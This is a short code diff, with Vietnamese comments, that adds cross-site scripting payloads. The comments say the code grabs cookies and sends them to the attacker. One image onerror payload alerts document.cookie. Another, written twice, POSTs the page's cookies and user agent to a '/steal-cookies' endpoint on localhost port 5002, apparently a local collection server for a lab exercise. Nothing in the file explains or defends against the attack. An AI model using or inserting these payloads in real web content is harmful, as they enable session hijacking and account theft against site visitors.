@@ -1,0 +1,7 @@
+
+// Đoạn code để lấy cookies
+
+ <img src="x" onerror="alert(document.cookie)"> 
+<img src="x" onerror="fetch('http://localhost:5002/steal-cookies', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:document.cookie,userAgent:navigator.userAgent})})">
+// Gửi cookies đến attacker
+<img src="x" onerror="fetch('http://localhost:5002/steal-cookies', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:document.cookie,userAgent:navigator.userAgent})})">
